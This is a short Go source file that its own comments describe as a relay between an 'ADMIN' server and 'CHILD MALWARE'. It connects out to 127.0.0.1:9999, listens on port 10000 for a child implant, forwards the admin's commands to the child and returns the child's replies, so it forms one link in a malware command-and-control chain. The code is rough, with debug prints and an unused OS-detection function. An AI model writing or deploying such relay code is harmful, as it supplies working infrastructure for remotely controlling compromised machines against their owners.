package main

import (
	"bufio"
	"fmt"
	"net"
	"runtime"
	"strings"
)

func OSCheck() string {
	var OSShell string
	if runtime.GOOS == "windows" {
		fmt.Println("OS identified as Windows")
		//command =
		OSShell = "windows"
		// err := ni

	} else if runtime.GOOS == "linux" {
		fmt.Println("OS identified as: Linux")
		OSShell = "linux"

	}
	return OSShell

}

func main() {

	//manual connection to ADMIN server
	// arguments := os.Args
	// if len(arguments) == 1 {
	// 	fmt.Println("Please provide host:port.")
	// 	return
	// }

	for {
		// CONNECT := arguments[1]
		CONNECT := "127.0.0.1:9999"
		c, err := net.Dial("tcp", CONNECT)
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Println("CONNECTED TO ADMIN, waiting on CHILD")
		// this may need to be a go routine
		defer c.Close()
		//======

		//Creating server for CHILD MALWARE
		fmt.Println("CREATING SERVER FOR CHILD")
		//opening port on local host port 10000 for child
		PORT := ":10000"
		l2, err := net.Listen("tcp", PORT)
		if err != nil {
			fmt.Println(err)
			return
		}
		defer l2.Close()

		//server connection for child to connect to.
		//connection on port 10000
		fmt.Println("SERVER ESTABLISHED ON: " + PORT + " WAITING FOR CHILD TO CONNECT")
		// c2 is child connection
		c2, err := l2.Accept()
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println("CHILD connected on", PORT)
		// fmt.Println("server establed on", PORT)

		//Reading in ADMIN COMMAND
		commandString, _ := bufio.NewReader(c).ReadString('\n')
		//Printing for debugging
		fmt.Print("COMMAND RECEIVED FROM ADMIN->: " + commandString)
		// Stopping code block
		if strings.TrimSpace(string(commandString)) == "STOP" {
			fmt.Println("TCP client exiting...")
			break
		}

		//Sending Command to Child socket
		text := commandString
		fmt.Fprintf(c2, text+"\n")

		if strings.TrimSpace(string(text)) == "STOP" {
			fmt.Println("Closing TCP server!")
			return
		}
		buf := make([]byte, 4096)
		//reading data from child
		len, err := c2.Read(buf)

		if err != nil {
			fmt.Println("Error reading:", err.Error())
			break
		}

		s := string(buf[:len])

		// fmt.Println("FROM CHILD->", s)
		//writing to ADMIN
		c.Write([]byte(s))
		l2.Close()
		c.Close()
		c2.Close()
		//end of main for loop
	}

}
